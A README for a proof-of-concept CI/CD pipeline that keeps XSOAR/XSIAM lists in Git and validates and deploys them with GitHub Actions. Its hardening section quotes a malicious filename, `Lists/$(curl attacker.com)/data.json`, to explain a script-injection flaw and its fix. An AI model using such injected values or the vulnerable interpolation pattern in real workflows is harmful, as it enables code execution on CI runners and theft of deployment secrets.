# XSOAR/XSIAM List Management CI/CD

## Overview

Proof of concept for managing XSOAR/XSIAM lists via Git with automated CI/CD. Lists are stored as file pairs (metadata YAML + raw data file) and validated/deployed through GitHub Actions.

## Problem

Managing lists in XSOAR/XSIAM manually through the UI doesn't scale well. Changes aren't tracked, there's no review process, and deployments are manual.

## Solution

Git-based workflow where lists are version controlled and CI/CD handles validation and deployment automatically.

### List Structure

Each list is a directory under `Lists/` containing two files:

- **`metadata.yml`** — defines the list id, name, type, and description
- **`data.<ext>`** — the raw list content (`.json`, `.csv`, or `.txt`)

```yaml
# Example metadata.yml
id: blocked-ips
name: Blocked IPs
type: json
description: List of IPs to block at the firewall.
```

### Supported List Types

| Type | Validation | Data File |
|---|---|---|
| `json` | Parses and validates JSON syntax | `data.json` |
| `csv` | Validates CSV structure and consistent column counts | `data.csv` |
| `custom` | Runs a Python script for validation | `data.txt` or any |

### Custom Validators

Custom validators live in `scripts/custom_validators/`. The system checks for `<list-directory-name>.py` first, then falls back to `default.py`. Each validator receives the data file path as an argument and exits 0 for pass, non-zero for fail.

## CI/CD Pipeline

### PR Validation (`validate-pr.yml`)

```mermaid
graph LR
    A[PR opened] --> B[Detect changed lists]
    B --> C[Run type-specific validation]
    C -->|Pass| D[Auto-merge PR]
    C -->|Fail| E[Block PR]
```

- Triggers on PRs to `main` touching `Lists/**`
- Only validates lists that actually changed
- Auto-merges via squash if all validations pass

### Deployment (`deploy-lists.yml`)

```mermaid
graph LR
    A[Merge to main] --> B[Check secrets exist]
    B -->|Missing| C[Fail fast]
    B -->|Present| D[Detect changed lists]
    D --> E[Upload via demisto-sdk]
```

- Triggers on push to `main` touching `Lists/**`
- Checks for required secrets before doing any setup (saves Actions minutes)
- Uploads only changed lists using `demisto-sdk`

### Required Secrets

| Secret | Purpose |
|---|---|
| `DEMISTO_BASE_URL` | XSOAR/XSIAM server URL |
| `DEMISTO_API_KEY` | API key for authentication |
| `XSIAM_AUTH_ID` | Auth ID for XSIAM |

## Workflow for Adding a List

1. Create `Lists/<list-name>/metadata.yml` with type and description
2. Add the data file (`data.json`, `data.csv`, etc.)
3. Open a PR to `main`
4. CI validates automatically
5. PR auto-merges on success
6. Deploy workflow uploads the list to XSOAR/XSIAM

## Dependencies

- **Python 3.12**
- **PyYAML** — parsing metadata files
- **demisto-sdk >=1.38.21** — uploading lists to XSOAR/XSIAM

## Security & Robustness Hardening

A code review identified several issues that were addressed:

### 1. GitHub Actions Script Injection (Security)

The PR validation workflow originally used `${{ }}` interpolation directly inside `run:` commands:

```yaml
# BEFORE — vulnerable to script injection
run: python scripts/validate.py ${{ steps.changed.outputs.dirs }}
```

An attacker could craft filenames under `Lists/` containing shell metacharacters (e.g., `Lists/$(curl attacker.com)/data.json`) that would execute during workflow runs. This is a well-known GitHub Actions anti-pattern.

**Fix:** Moved all `${{ }}` values into `env:` blocks so they're treated as data, not shell code:

```yaml
# AFTER — safe
env:
  CHANGED_DIRS: ${{ steps.changed.outputs.dirs }}
run: python scripts/validate.py $CHANGED_DIRS
```

Same treatment applied to `github.base_ref` in the git diff command.

### 2. Metadata Schema Validation (Robustness)

`validate.py` previously used `.get()` with silent defaults for metadata fields. If `type` was missing it fell through to a confusing "Unknown list type ''" error. If `id` or `name` were missing, no error at all.

**Fix:** Added upfront validation of required fields (`id`, `name`, `type`) with a clear error message listing which fields are missing.

### 3. UnicodeDecodeError in Custom Validator (Robustness)

`default.py` reads files as UTF-8 and checks for null bytes to detect binary content. But if the file isn't valid UTF-8 at all, `read_text()` raises an unhandled `UnicodeDecodeError` and the validator crashes instead of reporting a clean failure.

**Fix:** Wrapped the `read_text()` call in a try/except that catches `UnicodeDecodeError` and returns a clear failure message.

### 4. Deploy fetch-depth Assumption (Documentation)

The deploy workflow uses `fetch-depth: 2` so `upload.py` can diff `HEAD~1`. This only works correctly when PRs are squash-merged (one commit per merge). If someone pushes directly to main or the merge strategy changes, the diff could miss files or compare wrong commits.

**Fix:** Added a comment in the workflow documenting this assumption for future maintainers.

### Known Limitations (Acceptable for PoC)

- **Auto-merge bypasses human review** — anyone who can open a PR gets list data merged on validation pass alone. For production, consider requiring approvals via branch protection rules.
- **No rollback mechanism** — if a deployed list causes issues, there's no automated way to revert. A manual revert commit + re-deploy is needed.
- **No deployment verification** — the upload step trusts `demisto-sdk`'s exit code but doesn't verify the list is live.

## Status

> [!info] Proof of Concept
> This is a PoC. Not yet deployed to production.

## Tags

#xsoar #xsiam #cicd #automation #poc
